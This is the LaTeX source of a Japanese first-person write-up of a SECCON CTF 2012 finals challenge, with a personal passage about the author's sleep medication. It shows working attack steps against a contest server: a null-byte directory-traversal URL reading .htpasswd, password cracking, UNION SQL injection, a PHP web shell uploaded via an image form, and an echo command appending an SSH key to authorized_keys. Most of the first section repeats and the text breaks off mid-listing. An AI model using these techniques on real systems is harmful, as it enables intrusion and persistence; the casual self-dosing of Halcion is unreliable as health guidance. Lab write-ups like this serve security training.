\documentclass[draft]{xword}
\usepackage[default]{zxjatype}
\usepackage{fontspec}
\usepackage[hiragino-dx, scale=0.955]{zxjafont}
\usepackage{type1cm}
\usepackage[final]{listings}
\usepackage{fancybox}
\usepackage{layouts}
\usepackage{enumerate}
\usepackage{enumitem}
\usepackage{float}
\usepackage{vruler}
\usepackage{multicol}
\usepackage[obeyspaces]{url}
\usepackage{graphicx}
\usepackage{xcolor}
\usepackage{dirtree}
\usepackage{xltxtra}
\usepackage{sty/bxokumacro}
\usepackage{sty/bxascmac}
\usepackage{sty/my-style}
\usepackage{sty/terms}

\setjafontscale{0.955}

%\xeCJKsetup{KaiMingPunct+={?}}

\xeCJKsetwidth{!?}{1.5em}
\xeCJKDeclarePunctStyle{ mine }
{
	fixed-punct-ratio       = 1 ,
	fixed-margin-width      = 0 pt ,
	mixed-margin-width      = \maxdimen ,
	mixed-margin-ratio      = 1,
	middle-margin-width     = \maxdimen ,
	middle-margin-ratio     = 1,
	add-min-bound-to-margin = true ,
	min-bound-to-kerning    = true ,
	kerning-margin-minimum  = 0.5em,
}
\xeCJKsetup{PunctStyle=mine}

\setmainfont[Ligatures=TeX]{Times New Roman}

\fontspec[Mapping=tex-text, Ligatures={Common, Rare, Historic}]{Hoefler Text}
\newfontfamily\hoeflaer[Mapping=tex-text]{Hoefler Text}

\lstset{
	basicstyle=\footnotesize\tt,
	keywordstyle=\footnotesize\bf,
	breaklines=true,
	framerule=0pt,
	frame=l
	showstringspaces=false,
	xleftmargin=12pt,
	xrightmargin=1pt,
	tabsize=2,
	backgroundcolor={\color[gray]{.93}},
	basewidth={0.57em, 0.52em},
	lineskip=-0.42em
}

\lstdefinestyle{plain}{
	numbers=left,
	language=,
	moredelim=[is][\it]{_}{_},
}

\lstdefinestyle{sh}{
	numbers=left,
	language=sh
}

\lstdefinestyle{php}{
	numbers=left,
	language=php,
}

\lstdefinestyle{perl}{
	numbers=left,
	firstnumber=1,
	language=perl,
}

\lstdefinestyle{html}{
	numbers=left,
	firstnumber=1,
	language=HTML,
}

\def\makereversebox#1{%
	\leavevmode%
	{\setlength{\fboxsep}{.4pt}%
	\setbox0\hbox{%
		\colorbox{black}{\textcolor{white}{#1}}}%
		\hbox{%
			\hbox{%
				\vbox{%
					\hrule height \fboxrule\vskip-\fboxrule%
					\hbox{%
						\vrule width \fboxrule\hskip-\fboxrule%
						\box0%
						\hskip-\fboxrule%
					\vrule width \fboxrule}
					\vskip-\fboxrule}}}}}

\def\reverse#1{%
	\makereversebox{#1}}

\makeatletter

\newcommand{\rotate}[2][first=-40, last=40]{
	\chgrand[#1]
	\@tfor\letter:=#2\do{%
			\expandafter\rand\rotatebox[origin=c]{\therand}{\letter}}}

\makeatother

\def\WORD{%
	{\hoeflaer W\reverse{\bfseries\hoeflaer O}RD}}

\def\ctt#1{{\tt\small#1}}


\title{WORD -24 Edition-, 2012}
\author{吉村 優}
\subtitle{{\SECCON} CTF 全国大会}

\begin{document}

\chapter{\hoeflaer \reverse{S}ECCON \reverse{C}TF \lower.05em\hbox{\reverse{全}}国大会}

\begin{center}
\shadowbox{\small%
\begin{tabular}{l}
SECCON CTF 全国大会の開催、
運営に尽力して下さったSECCON実行委員をはじめとする皆様に感謝いたします。\\

またこの記事を書くにあたり、問題の掲載許可及び問題の資料を下さった
問題作成者の皆様に感謝申し上げます。
\end{tabular}
}
\end{center}


\section{}


\begin{multicols}{2}
\subsection{}
さて、俺は直ちに問題サーバーへとアクセスした。
問題は\Mercuryというものが一問のみ。
まあ、従来と同じように、時間の経過と共に問題が追加されてゆく形式なのであろう。

とりあえず問題には「FLAGページ」と書かれた\url{http://10.2.0.3/FLAG}というURL、
そして「キーワード」という入力フォームが用意されている。
とにかく\url{http://10.2.0.3/FLAG}へアクセスしてみる。

何も書かれていない白紙ファイル。
なるほど、何かの手段を用いてここにチームごとに定められた「フラッグワード」を書き込めば得点になるのだろう。
で、問題はどれだ。
とりあえず、\url{http://10.2.0.3/}へアクセスしてみると、
ドキュメントルートに置かれたファイルが見える。

\dirtree{%
	.1 /.
	.2 eng.txt.
	.2 jpn.txt.
	.2 stage1.cgi.
	.2 stage2/.
}

という構成が露呈している。
とりあえず、\ctt{stage2}というフォルダを覗いてみるか。
\url{http://10.2.0.3/stage2/}へアクセスすると、BASIC認証が出現した。
なるほど、このBASIC認証を突破するために、脆弱性があるであろう\ctt{stage1.cgi}を用いるということだろう。

\url{http://10.2.0.3/stage1.cgi}へアクセスすると、日本語と英語が切り替えられるだけのページが出現した。

\lstinputlisting[style=html]{src/2/stage1.cgi.html}

試しに英語へ切り替えると、\url{http://10.2.0.3/stage1.cgi?lang=eng}というアドレスへアクセスした。
なるほど、\ctt{lang}クエリでファイル名を渡しているだけ。
典型的なディレクトリトラバーサルの問題だ。
\url{http://10.2.0.3/stage1.cgi?lang=./stage2/.htpasswd}でOK。

\begin{lstlisting}
File not found. [./stage2/.htpasswd.txt]
\end{lstlisting}

くそ、尻に\ctt{.txt}を付与するタイプか。
ならばヌルバイト攻撃だろう。
\url{http://10.2.0.3/stage1.cgi?lang=./stage2/.htpasswd%00}でよい。

\lstinputlisting{src/2/.htpasswd}

うっ、暗号化されてる……。
もう駄目だ、おーぴーを使うしかない。

「おーぴー行けたか?ヌルバイト攻撃だ」

「ぉぅぃぇ!」

おーぴーの画面にも、同じ文字列が表示された。
さて、ここからどうしたものか。

「John The Ripper\footnote{総当たりと辞書攻撃によるパスワードクラックツール。}を使おう」

は?Joho The Ripperだと?
確かにこいつはどう見てもハッシュ値、複合化は無理。
となれば、John The Ripperということになるが……。
こんなことしている時間なんてあるのか?
とりあえず、このハッシュ値をGoogleで調べてみよう。
あわよくば出てくるかもしれない。
一旦大会用の回線を切断し、携帯電話を使ってインターネットに接続する。
そしてハッシュ値をそのままGoogleの検索フォームに叩き込む。
が、ダメ。検索結果はゼロ件。

すると、横にいたゆにゃ\footnote{情報科学類二年次、AC部屋勢。}が話しかけてくる。
彼は横浜大会から参加することになったメンバーで、
競技プログラミングやアルゴリズムに精通している。

「おーぴーはパスワードが分ったらしい」

まじかよ。

「パスワードは\ctt{222222}」

なるほどね。
とりあえず\ctt{stage2}へ進むと、

\begin{screen}
\centering
\textbf{Stage2 Keyword:} JohnTheRipperIsMyFriend 
\end{screen}

と表示されたページが現れる。
そしてページ中央には検索フォームと謎の表。

\begin{table}[H]
	\centering
	\begin{tabular}{|c|c|c|}
		\hline
		\textbf{No} & \textbf{ユーザ名} & \textbf{パスワード} \\ \hline
		1 & keigo & ******** \\ \hline
		2 & seccon & ********* \\ \hline
		3 & stage3 & *********** \\ \hline
	\end{tabular}
\end{table}

ああ、これは明らかにSOLインジェクションだ。
つくば大会と同様に\ctt{UNION}を流すタイプ。
テーブル名は……そうだ、さっきの\ctt{stage1.cgi}を使えばソースが見える。

「吉村君、今どこ?」

おーぴーが問う。

「今\ctt{stage2}、SQLインジェクションで------」

「それは今解いた、次は\ctt{stage3xYz}へ進んで」

マジかよおーぴー。
つくば大会の時はSQLなんてからきしだったのに。
まあいいや、とりあえず次だ。
\url{http://10.2.0.3/stage3xYz/}へ進む。

\lstinputlisting[style=html]{src/2/stage3.html}

キーワードは\textit{IamSQLInjectionMaster}らしい。
まあ、次は画像のアップローダーと思しきプログラムだ。

手始めにデスクトップに置いてあった\ctt{latex.ltx}をアップロードしてみよう。

\begin{screen}
\centering
latex.ltxをアップロードしました。
\end{screen}

直ちにアップロードが完了し、画像ではない\ctt{latex.ltx}が、
\url{http://10.2.0.3/stage3xYz/images/latex.ltx}というURLでアップロードされてしまった。
よし、名前もそのままらしいな。

ということで、直ちにスクリプトを書く。

\lstinputlisting[style=php]{src/2/attack.php}

これを\ctt{gomi.php}などと適当なPHPファイルとして設置すれば、
あらゆるOSコマンドを動かすことが出来るようになる。

\begin{screen}
\centering
gomi.phpをアップロードしました。
\end{screen}

「おーぴー、\ctt{images}に\ctt{gomi.php}をアップした。
これで任意のOSコマンドを使える」

さて、とりあえず\ctt{stage3xYz}を\ctt{ls}してみるか。
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=ls ../}を実行してみよう。

\dirtree{%
	.1 /.
	.2 HINT1:\_Use\_SSH.
	.2 HINT2:\_Append\_Only.
	.2 images/.
	.2 index.php.
}

\ctt{HINT1:\_Use\_SSH}?なんだこれは?
まあとりあえず、\ctt{FLAG}を見てみるか。

\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=ls ../../}へアクセス。

\dirtree{%
	.1 /.
	.2 jpn.txt.
	.2 eng.txt.
	.2 stage1.cgi.
	.2 stage2/.
	.2 stage3xYz/.
	.2 FLAG.
}

これじゃ意味不明だな。
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=ls -al ../../}だ。

\lstinputlisting[xleftmargin=1pt, basicstyle=\fontsize{6pt}{15pt}\tt]{src/2/lsDocRoot.txt}

なるほど、\ctt{stage5}になれば\ctt{FLAG}に書けるってわけか。

しかし先ほどのヒント、「Use\_SSH」とはどういうことなのだろうか。
SSHでログインするにしても、ユーザー名も分からぬこの状況ではどうしようもない……。
いや、今この\ctt{gomi.php}を実行しているユーザーならば特定出来る。
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=id}だ。

\begin{lstlisting}
uid=502(stage4) gid=502(stage4) groups=502(stage4),0(root) uid=502(stage4) gid=502(stage4) groups=502(stage4),0(root) 
\end{lstlisting}

よし、俺は\ctt{stage4}だ。
ならば、

「おーぴー、\ctt{id}が\ctt{stage4}だ。\ctt{authorized\_keys}を」

そこまで言ったところで全てを察したおーぴーは、直ちに作業に戻った。
ならば俺も作業開始だ。
\ctt{id}が\ctt{stage4}であるならば、\ctt{stage4}の\ctt{authorized\_keys}に俺の公開鍵を書き込めば、
そのまま\url{stage4@10.2.0.3}へSSHでログイン出来る可能性が高い。
まずは適当な鍵を生成せねば……。
\ctt{ssh-keygen}だ。

\begin{lstlisting}
$ ssh-keygen -f ~/.ssh/id_rsa.gomi
\end{lstlisting}

そして、公開鍵\ctt{id\_rsa.gomi.pub}を\ctt{gomi.php}から書き込めばいい。
つまり、

\end{multicols}

\begin{lstlisting}
http://10.2.0.3/stage3xYz/images/gomi.php?cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQ/02G1jx0M
6Fw7ybYhKuMNlDrG/6sFyifFWO+XdmowzSj+L4Ip4LpZer1xCINJWJpcGGeIy1JqcoXDagA70yqWWO9qcstCdSKIlhCBxD78VBS6+f
tvHXpmM7818npSKGy0yeKaajNIEYQYKUGVYVDcLKWEFXY2utDd2wV3M2BRsEZZyu7jlBOqtfEeQbou3so36lIipM4FAWaZGzcNtnN4
0xfQLG1twuDTvxYINqTwbezRueYQXghIWTrD3fyWEDH86BsaQ6oN68XD0sscHuI4IC3/R19afZKiti8mHqwmC5JODpZ2McUGzwZIqm
55c/h83YP1izckJqaKW7pg9V yoshimura_yuu@yoshimura-yuu.local" >> /home/stage4/.ssh/authorized_keys
\end{lstlisting}

\begin{multicols}{2}

へアクセスすればいい。
そして、

\begin{lstlisting}
$ ssh -i ~/.ssh/id_rsa.gomi stage4@10.0.2.3
\end{lstlisting}

とすればよい。

\begin{lstlisting}
Permission denied.
\end{lstlisting}

うっ……!マジか。
この方針、不味かったか?

「おーぴー、\ctt{stage4}でログイン出来た?」

「ぉぅぃぇ!」

なんだと……。
ということは、俺の書いた\ctt{authorized\_keys}が不正?
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=cat /home/stage4/.ssh/authorized_keys}
で中身を確認だ。

\end{multicols}

\lstinputlisting{src/2/authorized_keys1}

\begin{multicols}{2}

うっ、しまった。
\ctt{+}がURLエンコードでスペースになってしまったのか。
\ctt{+}はええと、Perlで調べるか。

\begin{lstlisting}
$ perl -MURI::Escape -E 'say uri_escape("+")'
%2B
\end{lstlisting}

どうやら\ctt{+}は\ctt{\%2B}であると分った。
後はさっきの\ctt{id\_rsa.gomi.pub}の\ctt{+}を\ctt{\%2B}へ置換したものを流し込めばよい。
この程度の置換であれば、Vimの機能で一撃だ。

\end{multicols}

\begin{lstlisting}
http://10.2.0.3/stage3xYz/images/gomi.php?cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQ/02G
1jx0M6Fw7ybYhKuMNlDrG/6sFyifFWO%2BXdmowzSj%2BL4Ip4LpZer1xCINJWJpcGGeIy1JqcoXDagA70yqWWO9qcstCdSKI
lhCBxD78VBS6%2BftvHXpmM7818npSKGy0yeKaajNIEYQYKUGVYVDcLKWEFXY2utDd2wV3M2BRsEZZyu7jlBOqtfEeQbou3so
36lIipM4FAWaZGzcNtnN40xfQLG1twuDTvxYINqTwbezRueYQXghIWTrD3fyWEDH86BsaQ6oN68XD0sscHuI4IC3/R19afZKi
ti8mHqwmC5JODpZ2McUGzwZIqm55c/h83YP1izckJqaKW7pg9V yoshimura_yuu@yoshimura-yuu.local" >> 
/home/stage4/.ssh/authorized_keys
\end{lstlisting}

\begin{multicols}{2}

でいいはずだ。
そして二回目の、

\begin{lstlisting}
$ ssh -i ~/.ssh/id_rsa.gomi stage4@10.0.2.3
\end{lstlisting}

トライ。

\begin{lstlisting}
Last login: Sat Feb 23 10:02:40 2013

Stage4 Keyword: IcouldLoginWithSSHd

[satge4@localhost ~]$
\end{lstlisting}

勝った。
このキーワードは既におーぴーが書き込んだらしい。
しかし謎なのは、

「おーぴー、どうやって\ctt{authorized\_keys}に書き込んだ?」

「Fiddler\footnote{プロクシのように振る舞うWebデバッガー。}を使った」

なるほど。
俺みたいに文字列を直接アドレスバーに入力するような、
古典的な手法はもうダメってことだな。
まあともかく、これで俺もサーバーの住人だ。

しかし、ここに来てログインしているのは俺とおーぴーだけ。
チームの全員でこのサーバーを調べた方が良いだろう。
とりあえず、他のメンバーに手早く\ctt{gomi.php}の使い方を説明した。

まあ、事前にCOINSの環境でこの話はしたことがある。
COINSの環境はPHPが\ctt{\_www}の権限で動いているので、
PHPから、つまりはApacheから参照出来る情報は全て他のユーザーが取得出来る。
故に、PHPがデータベースにアクセスするための情報や、
Apacheの設定ファイルである\ctt{.htpasswd}なども閲覧出来る。
という話を\urandomの皆には事前にしてあるので、これはCOINS環境の応用問題だ。
簡単に分かるはず。

しかし、

「\ctt{gomi.php}でInternal Server Error出るんだけど……」

おしろが言う。
どういうことだ?
とにかく調べてみるか。
ドキュメントルートはどこだか不明だが、まあ恐らく
\ctt{/var/www/}の下の何処か。
ここで\ctt{ls}を発砲。

\begin{lstlisting}
[stage4@localhost ~]$ cd /var/www
[stage4@localhost www]$ ls
DB  cgi-bin  error  html  icons
\end{lstlisting}

この中で可能性が最も高そうなのは\ctt{html}だ。
となると、\ctt{gomi.php}があるのは\ctt{html/stage3xYz/image/}ということだ。
とりあえずそこで\ctt{ls}を撃つ。

\begin{lstlisting}
[stage4@localhost images]$ ls
gomi.php index.html a.php hogehoge.cgi key.png test.php gomi.php attack.php 
\end{lstlisting}

なんだこれは?
俺がアップロードした覚えのないファイルが大量に……。
おーぴーなどが適当にアップロードしたにしては、流石に多過ぎだ。
もしかして、これ、あらゆるチームが同じサーバーへ攻撃しているのか?
ならば俺のやるべきことは、

\begin{lstlisting}
[stage4@localhost images]$ rm -rf *
rm: cannot remove `index.html': Permission Denied.
\end{lstlisting}

そして、\ctt{ls}を再度。

\begin{lstlisting}
[stage4@localhost images]$ ls
index.html
\end{lstlisting}

よし、ゴミどもは削除した。
この\ctt{index.html}は大会側が用意したものだろうから、
何か強いパーミッションで保護されているに違いない。
それ以外のファイル、例えば\ctt{gomi.php}など、
\ctt{stage4}の権限でなんとか出来るファイルについては壊滅だ。

敵チームがこのサーバーへログインするには、
俺の置いたようなスクリプトを設置し、
\ctt{authorized\_keys}へ公開鍵を書き込む以外にないだろう。
だがここで俺が立て籠り、アップロードされたファイルをことごとく削除したら、
当然敵チームが公開鍵\ctt{authorized\_keys}へ書き込むのは困難になるだろう。
だからひたすら\ctt{rm -rf *}を連打だ。
これで俺の置いた\ctt{gomi.php}も破滅したが、もはやあんなものは必要ない。
少くとも俺とおーぴーの公開鍵が\ctt{authorized\_keys}に登録されている以上、
我々が残りのメンバーの公開鍵をUSBメモリか何かで受け取り、書き込めばよい。

とりあえず、おしろの公開鍵を登録せねば。
既にログインしていためいす\footnote{情報科学類二年次、クラス代表者の一人。}に事情を話し、
\ctt{rm -rf *}を連打してもらうことにした。
めいすは今回の全国大会から\urandomに参加した人間で、C\#やRubyを使ってプログラムを書く人間だ。

おしろはおーぴーが所持していたUSBメモリに自前の公開鍵を入力して俺に渡す。
それを受けとり、手早く書き込む。

\end{multicols}

\begin{lstlisting}
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDHqTaybkv0pI53h5HEZxj8Mz0i4SfWIWTp0RpABgyJDloyKCv4YkX3/u1
k4eW4vuDD9wje1zLbnLl3cX/Elvh4NeQ8MMXwZSJqZrShDEpfqkkYlhIVWsNbui9JRSmeTVSbQiJIdb6tc6NYTlyujp/f/5BumqKUn
RY1WE9BNz9sbc6vm4MA1eU33j7HQGD2xYDc7fHks8Fy7NwdDjrfm4CZEpxhrur4HL8CQAEvNAa7xaLWOwqbDxJlo3eVKCtzrCSSje4
HZ41AoNUbHf7PKznv2cwSWP5z5MIfVvvoZsRmtxbVG4UEN0pA578uo8rIRq87z6MZ8LQ7usXweUsGuZr favcasle@ubuntu
>> /home/stage4/.ssh/authorized_keys
\end{lstlisting}

\begin{multicols}{2}

他のメンバーの公開鍵はおーぴーが処理したらしい。
俺はめいすから削除する役割を代ってもらい、
めいすにはこの作業をシェルスクリプトか何かで自動化してもらう。

% vimexec: let g:tex_no_math = 0
% vimexec: syntax off
% vimexec: syntax on
% vimexec: source ~/.gvimrc

\subsection{}
編集部でメールサーバーの用意を済ませて帰宅する。
真円の月光で明るい夜を自転車で走りながら、
そろそろ抗ヒスタミン剤を用意せねばならんなどと思う。

薬といえば、今日はハルシオン\footnote{睡眠導入剤のこと。}%
を入れようか迷うな。
ハルシオンはナイフみたいに切れ味のある鋭利な睡眠導入剤だと思うけど、
時々サイドエフェクトなのか次の日が鉛みたいに眠い時がある。
大学の授業であれば眠くても問題ないのでそのまま適当に服用するのだけど、
明日は全国大会の二日目なので、そういうわけにもいかない。
ただ、あの眠気は前に使っていたエビリファイ\footnote{抗不安薬・向精神薬として使われる薬のこと。}%
の副作用なのかもしれない。
いずれにしても最悪の場合、アラームでも起床出来ぬ程に昏睡してそのまま二日目を寝過ごすという可能性もある故、
今日はやはり入れない方がいいかもしれないな。
しかしこういう肝心な時に使えないというか、
使用を躊躇させるような副作用があるハルシオンはちょっと危ないな。
最近はロゼレム\footnote{睡眠導入剤のこと。}を貰っているが、
これは正直睡眠導入剤としてはイマイチで、
先生が言っていたように体内リズムを改善するサプリメントみたいな感じだ。
やはり今度はマイスリー\footnote{睡眠導入剤のこと。}あたりに挑戦してもいいかもしれない。

脳内会議で今日のハルシオン使用を止める判断を下した頃に家へ到着した。
適当にシャワーを浴びるなどして寝るための支度を整える。
そして、ハルシオンは入れずロゼレムとセディール\footnote{抗不安薬のこと。}だけ服用して布団に入る。
携帯電話のアラームを設定して寝ようとする。
だいたい思った通りだけど、こういう重要な予定があるような時というのは寝られない。
どうしようかな、ハルシオン、やっぱり入れとこうかな。
だけどハルシオンは変な時間にいれると体内リズムが破壊されるような印象があるから、
入れるならなるべく早いうちに決断したい……。
こういう時は神の決断を仰ぐしかあるまい。
今時間を確認して「分」が偶数か奇数かで入れるか入れないかを決定しよう。

よし、決した。
偶数であれば入れる、奇数であれば入れず。
脇に置いてある携帯電話の電源ボタンを押して、時間をチェックする。
結果は0時14分、偶数によりハルシオンの導入が決定された。
神の仰せの通りに俺はハルシオンを追加で飲み、眠ることにした。
仮に明日眠気が残ったとしても、会場にたくさん用意してあったエナジードリンクでかき消せばよい。
ハルシオンとカフェンインのどちらが強いか、確かめるいい機会となるだろう。

\end{multicols}
\section{}


\begin{multicols}{2}
\subsection{}
さて、俺は直ちに問題サーバーへとアクセスした。
問題は\Mercuryというものが一問のみ。
まあ、従来と同じように、時間の経過と共に問題が追加されてゆく形式なのであろう。

とりあえず問題には「FLAGページ」と書かれた\url{http://10.2.0.3/FLAG}というURL、
そして「キーワード」という入力フォームが用意されている。
とにかく\url{http://10.2.0.3/FLAG}へアクセスしてみる。

何も書かれていない白紙ファイル。
なるほど、何かの手段を用いてここにチームごとに定められた「フラッグワード」を書き込めば得点になるのだろう。
で、問題はどれだ。
とりあえず、\url{http://10.2.0.3/}へアクセスしてみると、
ドキュメントルートに置かれたファイルが見える。

\dirtree{%
	.1 /.
	.2 eng.txt.
	.2 jpn.txt.
	.2 stage1.cgi.
	.2 stage2/.
}

という構成が露呈している。
とりあえず、\ctt{stage2}というフォルダを覗いてみるか。
\url{http://10.2.0.3/stage2/}へアクセスすると、BASIC認証が出現した。
なるほど、このBASIC認証を突破するために、脆弱性があるであろう\ctt{stage1.cgi}を用いるということだろう。

\url{http://10.2.0.3/stage1.cgi}へアクセスすると、日本語と英語が切り替えられるだけのページが出現した。

\lstinputlisting[style=html]{src/2/stage1.cgi.html}

試しに英語へ切り替えると、\url{http://10.2.0.3/stage1.cgi?lang=eng}というアドレスへアクセスした。
なるほど、\ctt{lang}クエリでファイル名を渡しているだけ。
典型的なディレクトリトラバーサルの問題だ。
\url{http://10.2.0.3/stage1.cgi?lang=./stage2/.htpasswd}でOK。

\begin{lstlisting}
File not found. [./stage2/.htpasswd.txt]
\end{lstlisting}

くそ、尻に\ctt{.txt}を付与するタイプか。
ならばヌルバイト攻撃だろう。
\url{http://10.2.0.3/stage1.cgi?lang=./stage2/.htpasswd%00}でよい。

\lstinputlisting{src/2/.htpasswd}

うっ、暗号化されてる……。
もう駄目だ、おーぴーを使うしかない。

「おーぴー行けたか?ヌルバイト攻撃だ」

「ぉぅぃぇ!」

おーぴーの画面にも、同じ文字列が表示された。
さて、ここからどうしたものか。

「John The Ripper\footnote{総当たりと辞書攻撃によるパスワードクラックツール。}を使おう」

は?Joho The Ripperだと?
確かにこいつはどう見てもハッシュ値、複合化は無理。
となれば、John The Ripperということになるが……。
こんなことしている時間なんてあるのか?
とりあえず、このハッシュ値をGoogleで調べてみよう。
あわよくば出てくるかもしれない。
一旦大会用の回線を切断し、携帯電話を使ってインターネットに接続する。
そしてハッシュ値をそのままGoogleの検索フォームに叩き込む。
が、ダメ。検索結果はゼロ件。

すると、横にいたゆにゃ\footnote{情報科学類二年次、AC部屋勢。}が話しかけてくる。
彼は横浜大会から参加することになったメンバーで、
競技プログラミングやアルゴリズムに精通している。

「おーぴーはパスワードが分ったらしい」

まじかよ。

「パスワードは\ctt{222222}」

なるほどね。
とりあえず\ctt{stage2}へ進むと、

\begin{screen}
\centering
\textbf{Stage2 Keyword:} JohnTheRipperIsMyFriend 
\end{screen}

と表示されたページが現れる。
そしてページ中央には検索フォームと謎の表。

\begin{table}[H]
	\centering
	\begin{tabular}{|c|c|c|}
		\hline
		\textbf{No} & \textbf{ユーザ名} & \textbf{パスワード} \\ \hline
		1 & keigo & ******** \\ \hline
		2 & seccon & ********* \\ \hline
		3 & stage3 & *********** \\ \hline
	\end{tabular}
\end{table}

ああ、これは明らかにSOLインジェクションだ。
つくば大会と同様に\ctt{UNION}を流すタイプ。
テーブル名は……そうだ、さっきの\ctt{stage1.cgi}を使えばソースが見える。

「吉村君、今どこ?」

おーぴーが問う。

「今\ctt{stage2}、SQLインジェクションで------」

「それは今解いた、次は\ctt{stage3xYz}へ進んで」

マジかよおーぴー。
つくば大会の時はSQLなんてからきしだったのに。
まあいいや、とりあえず次だ。
\url{http://10.2.0.3/stage3xYz/}へ進む。

\lstinputlisting[style=html]{src/2/stage3.html}

キーワードは\textit{IamSQLInjectionMaster}らしい。
まあ、次は画像のアップローダーと思しきプログラムだ。

手始めにデスクトップに置いてあった\ctt{latex.ltx}をアップロードしてみよう。

\begin{screen}
\centering
latex.ltxをアップロードしました。
\end{screen}

直ちにアップロードが完了し、画像ではない\ctt{latex.ltx}が、
\url{http://10.2.0.3/stage3xYz/images/latex.ltx}というURLでアップロードされてしまった。
よし、名前もそのままらしいな。

ということで、直ちにスクリプトを書く。

\lstinputlisting[style=php]{src/2/attack.php}

これを\ctt{gomi.php}などと適当なPHPファイルとして設置すれば、
あらゆるOSコマンドを動かすことが出来るようになる。

\begin{screen}
\centering
gomi.phpをアップロードしました。
\end{screen}

「おーぴー、\ctt{images}に\ctt{gomi.php}をアップした。
これで任意のOSコマンドを使える」

さて、とりあえず\ctt{stage3xYz}を\ctt{ls}してみるか。
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=ls ../}を実行してみよう。

\dirtree{%
	.1 /.
	.2 HINT1:\_Use\_SSH.
	.2 HINT2:\_Append\_Only.
	.2 images/.
	.2 index.php.
}

\ctt{HINT1:\_Use\_SSH}?なんだこれは?
まあとりあえず、\ctt{FLAG}を見てみるか。

\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=ls ../../}へアクセス。

\dirtree{%
	.1 /.
	.2 jpn.txt.
	.2 eng.txt.
	.2 stage1.cgi.
	.2 stage2/.
	.2 stage3xYz/.
	.2 FLAG.
}

これじゃ意味不明だな。
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=ls -al ../../}だ。

\lstinputlisting[xleftmargin=1pt, basicstyle=\fontsize{6pt}{15pt}\tt]{src/2/lsDocRoot.txt}

なるほど、\ctt{stage5}になれば\ctt{FLAG}に書けるってわけか。

しかし先ほどのヒント、「Use\_SSH」とはどういうことなのだろうか。
SSHでログインするにしても、ユーザー名も分からぬこの状況ではどうしようもない……。
いや、今この\ctt{gomi.php}を実行しているユーザーならば特定出来る。
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=id}だ。

\begin{lstlisting}
uid=502(stage4) gid=502(stage4) groups=502(stage4),0(root) uid=502(stage4) gid=502(stage4) groups=502(stage4),0(root) 
\end{lstlisting}

よし、俺は\ctt{stage4}だ。
ならば、

「おーぴー、\ctt{id}が\ctt{stage4}だ。\ctt{authorized\_keys}を」

そこまで言ったところで全てを察したおーぴーは、直ちに作業に戻った。
ならば俺も作業開始だ。
\ctt{id}が\ctt{stage4}であるならば、\ctt{stage4}の\ctt{authorized\_keys}に俺の公開鍵を書き込めば、
そのまま\url{stage4@10.2.0.3}へSSHでログイン出来る可能性が高い。
まずは適当な鍵を生成せねば……。
\ctt{ssh-keygen}だ。

\begin{lstlisting}
$ ssh-keygen -f ~/.ssh/id_rsa.gomi
\end{lstlisting}

そして、公開鍵\ctt{id\_rsa.gomi.pub}を\ctt{gomi.php}から書き込めばいい。
つまり、

\end{multicols}

\begin{lstlisting}
http://10.2.0.3/stage3xYz/images/gomi.php?cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQ/02G1jx0M
6Fw7ybYhKuMNlDrG/6sFyifFWO+XdmowzSj+L4Ip4LpZer1xCINJWJpcGGeIy1JqcoXDagA70yqWWO9qcstCdSKIlhCBxD78VBS6+f
tvHXpmM7818npSKGy0yeKaajNIEYQYKUGVYVDcLKWEFXY2utDd2wV3M2BRsEZZyu7jlBOqtfEeQbou3so36lIipM4FAWaZGzcNtnN4
0xfQLG1twuDTvxYINqTwbezRueYQXghIWTrD3fyWEDH86BsaQ6oN68XD0sscHuI4IC3/R19afZKiti8mHqwmC5JODpZ2McUGzwZIqm
55c/h83YP1izckJqaKW7pg9V yoshimura_yuu@yoshimura-yuu.local" >> /home/stage4/.ssh/authorized_keys
\end{lstlisting}

\begin{multicols}{2}

へアクセスすればいい。
そして、

\begin{lstlisting}
$ ssh -i ~/.ssh/id_rsa.gomi stage4@10.0.2.3
\end{lstlisting}

とすればよい。

\begin{lstlisting}
Permission denied.
\end{lstlisting}

うっ……!マジか。
この方針、不味かったか?

「おーぴー、\ctt{stage4}でログイン出来た?」

「ぉぅぃぇ!」

なんだと……。
ということは、俺の書いた\ctt{authorized\_keys}が不正?
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=cat /home/stage4/.ssh/authorized_keys}
で中身を確認だ。

\end{multicols}

\lstinputlisting{src/2/authorized_keys1}

\begin{multicols}{2}

うっ、しまった。
\ctt{+}がURLエンコードでスペースになってしまったのか。
\ctt{+}はええと、Perlで調べるか。

\begin{lstlisting}
$ perl -MURI::Escape -E 'say uri_escape("+")'
%2B
\end{lstlisting}

どうやら\ctt{+}は\ctt{\%2B}であると分った。
後はさっきの\ctt{id\_rsa.gomi.pub}の\ctt{+}を\ctt{\%2B}へ置換したものを流し込めばよい。
この程度の置換であれば、Vimの機能で一撃だ。

\end{multicols}

\begin{lstlisting}
http://10.2.0.3/stage3xYz/images/gomi.php?cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQ/02G
1jx0M6Fw7ybYhKuMNlDrG/6sFyifFWO%2BXdmowzSj%2BL4Ip4LpZer1xCINJWJpcGGeIy1JqcoXDagA70yqWWO9qcstCdSKI
lhCBxD78VBS6%2BftvHXpmM7818npSKGy0yeKaajNIEYQYKUGVYVDcLKWEFXY2utDd2wV3M2BRsEZZyu7jlBOqtfEeQbou3so
36lIipM4FAWaZGzcNtnN40xfQLG1twuDTvxYINqTwbezRueYQXghIWTrD3fyWEDH86BsaQ6oN68XD0sscHuI4IC3/R19afZKi
ti8mHqwmC5JODpZ2McUGzwZIqm55c/h83YP1izckJqaKW7pg9V yoshimura_yuu@yoshimura-yuu.local" >> 
/home/stage4/.ssh/authorized_keys
\end{lstlisting}

\begin{multicols}{2}

でいいはずだ。
そして二回目の、

\begin{lstlisting}
